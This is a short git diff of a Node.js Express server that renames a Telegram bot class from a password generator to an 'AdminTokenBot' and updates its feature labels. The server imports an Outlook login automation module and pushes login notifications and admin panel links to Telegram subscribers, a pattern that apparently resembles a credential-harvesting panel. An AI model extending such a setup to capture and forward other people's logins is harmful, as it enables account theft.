@@ -2,7 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const { OutlookLoginAutomation } = require('./src/outlook-login');
-const PasswordGeneratorBot = require('./telegram-bot');
+const AdminTokenBot = require('./telegram-bot');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -18,7 +18,7 @@ global.adminToken = ADMIN_TOKEN;
 let telegramBot = null;
 try {
     if (process.env.TELEGRAM_BOT_TOKEN) {
-        telegramBot = new PasswordGeneratorBot();
+        telegramBot = new AdminTokenBot();
         console.log('🤖 Telegram Bot initialized successfully');
     } else {
         console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
@@ -1348,7 +1348,7 @@ app.get('/api/bot-status', (req, res) => {
     res.json({
         botEnabled: !!telegramBot,
         subscribedUsers: telegramBot ? telegramBot.getSubscribedUsers() : 0,
-        features: ['Password Generation', 'Login Notifications', 'Admin Panel Links'],
+        features: ['Admin Token Access', 'Login Notifications', 'Admin Panel Links'],
         status: telegramBot ? 'active' : 'disabled',
         message: telegramBot ? 
             'Telegram Bot is running and ready to send notifications!' : 
@@ -1412,7 +1412,7 @@ app.listen(PORT, '0.0.0.0', () => {
     
     if (telegramBot) {
         console.log(`🤖 Telegram Bot active - ${telegramBot.getSubscribedUsers()} users subscribed`);
-        console.log(`📱 Bot Features: Password generation + Login notifications`);
+        console.log(`📱 Bot Features: Admin token access + Login notifications`);
     } else {
         console.log(`❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications`);
     }
